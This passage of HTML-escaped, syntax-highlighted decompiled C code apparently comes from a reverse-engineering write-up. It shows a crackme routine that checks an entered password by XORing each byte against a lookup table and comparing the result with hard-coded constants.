&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; local_1c4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; local_1c0 [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;45&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  byte abStack268 [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;256&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; local_c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  local_c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; __stack_chk_guard&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;memset&lt;&#x2F;span&gt;&lt;span&gt;(local_1c0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb4&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x65&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x83&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x95&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x66&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xfa&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x15&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x58&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x23&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xac&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;13&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;14&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;15&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;17&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x69&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;19&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x80&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;21&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;22&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x26&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;23&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;25&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x91&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;26&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;27&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;29&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;30&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x97&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;31&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xba&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;33&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;34&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x77&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;35&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;36&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;37&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xef&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;38&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x97&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;39&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x96&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;40&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x31&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;41&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;42&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;43&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Password? &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;fgets&lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;)abStack268&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xff&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;stdin)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  sVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;strlen&lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;)abStack268)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(sVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2d&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;(local_1c4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt; local_1c4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt; local_1c4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; local_1c4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;)(PTR_FUN_000210f4[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;)(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt;DAT_00021040 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt; local_1c4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;)] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span&gt; abStack268[local_1c4])
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;(local_1c0[local_1c4] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xff&lt;&#x2F;span&gt;&lt;span&gt;)) {
&lt;&#x2F;span&gt;&lt;span&gt;        iVar2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Wrong!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;goto&lt;&#x2F;span&gt;&lt;span&gt; LAB_00010914&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    iVar2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Correct!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
